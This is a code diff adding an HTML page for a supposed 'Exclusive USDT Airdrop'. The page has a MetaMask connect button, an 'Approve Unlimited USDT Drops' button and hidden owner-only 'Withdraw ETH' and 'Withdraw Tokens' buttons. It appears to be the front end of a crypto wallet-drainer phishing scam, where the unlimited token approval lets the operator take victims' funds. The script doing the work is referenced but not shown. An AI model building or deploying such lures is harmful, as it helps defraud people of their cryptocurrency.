@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- Document metadata -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Exclusive Airdrop Opportunity</title>
+  
+  <!-- Importing Google Fonts for custom typography -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+
+  <!-- Link to external CSS styles -->
+  <link rel="stylesheet" href="style.css"> 
+</head>
+<body>
+ <!-- Main container for the airdrop page -->
+  <div class="container">
+    <!-- Page title -->
+    <h1>🎉 Exclusive USDT Airdrop Just For You! 🎉</h1>
+    <!-- Subtitle describing the offer -->
+    <h2>Claim your rewards today and start your journey to success!</h2>
+
+    <!-- Button to connect the user's MetaMask wallet -->
+    <button id="connectButton" class="btn">Connect to MetaMask</button>
+    <!-- Button for approving token spending, disabled by default -->
+    <button id="approveButton" class="btn" disabled>Approve Unlimited USDT Drops</button>
+
+    <!-- Container for the airdrop claim button -->
+    <div class="claim-btn-container">
+      <!-- Button to claim the airdrop, disabled by default -->
+      <button id="claimAirdropButton" class="btn" disabled>Claim Your Airdrop Now!</button>
+      <!-- Message displayed while processing transactions -->
+      <div id="processingMessage" class="processing">Processing...</div>
+    </div>
+
+    <!-- Additional buttons only visible to the contract owner -->
+    <div class="claim-btn-container" id="ownerButtons" style="display:none;">
+      <!-- Button for withdrawing ETH from the contract -->
+      <button id="withdrawETHButton" class="btn">Withdraw ETH</button>
+      <!-- Button for withdrawing tokens from the contract -->
+      <button id="withdrawTokensButton" class="btn">Withdraw Tokens</button>
+    </div>
+
+    <!-- Footer section with terms and contact information -->
+    <div class="footer">
+      <p>By participating, you agree to our <a href="#">Terms & Conditions</a>.</p>
+      <p>Need help? <a href="#">Contact Us</a></p>
+    </div>
+  </div>
+
+  <!-- Include Web3.js library -->
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.1/dist/web3.min.js"></script>
+
+  <!-- External JavaScript file -->
+  <script src="script.js"></script>
+</body>
+</html>
